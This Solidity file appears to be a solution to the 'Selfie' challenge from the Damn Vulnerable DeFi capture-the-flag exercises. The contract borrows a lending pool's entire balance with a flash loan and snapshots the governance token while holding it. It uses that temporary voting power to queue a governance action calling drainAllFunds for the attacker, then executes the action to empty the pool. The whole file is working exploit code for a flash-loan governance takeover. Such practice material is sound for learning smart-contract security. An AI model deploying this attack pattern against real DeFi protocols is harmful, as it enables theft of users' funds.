// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";

/**
 * @title SelfieAttackContract
 * @author Edoardo Ierina
 */
contract SelfieAttackContract {

    uint256 private actionId;
    address immutable private attacker;
    DamnValuableTokenSnapshot immutable private token;
    SimpleGovernance immutable private governance;
    SelfiePool immutable private pool;

    constructor(address attackerAddress, address tokenAddress, address governanceAddress, address poolAddress) {
        attacker = attackerAddress;
        token = DamnValuableTokenSnapshot(tokenAddress);
        governance = SimpleGovernance(governanceAddress);
        pool = SelfiePool(poolAddress);
    }

    function receiveTokens(address tokenAddress, uint256 borrowAmount) external {
        require(tokenAddress == address(token), "Unsupported/unexpected token.");
        require(msg.sender == address(pool), "Only SelfiePool can execute this action.");
        
        token.snapshot();
        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", attacker);
        actionId = governance.queueAction(address(pool), data, 0);
            
        token.transfer(msg.sender, borrowAmount);
    }

    function queueAttack() external {
        uint256 poolBalance = token.balanceOf(address(pool));

        pool.flashLoan(poolBalance);
    }


    function executeAttack() external {
        governance.executeAction(actionId);
    }
}
